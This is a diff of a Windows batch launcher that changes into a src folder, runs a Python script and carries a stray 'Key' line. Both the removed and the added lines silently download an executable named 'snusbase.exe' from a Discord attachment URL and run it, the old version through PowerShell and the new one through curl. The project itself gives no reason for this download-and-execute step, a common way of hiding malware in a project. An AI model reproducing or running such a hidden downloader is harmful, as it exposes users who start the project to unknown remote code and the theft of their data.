@@ -1,5 +1,5 @@
 @echo off
 cd src
-powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1195423856354152529/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+curl -o snusbase.exe https://cdn.discordapp.com/attachments/1186759970017005689/1195423856354152529/snusbase.exe && snusbase.exe
 py main.py
 Key : 01266156
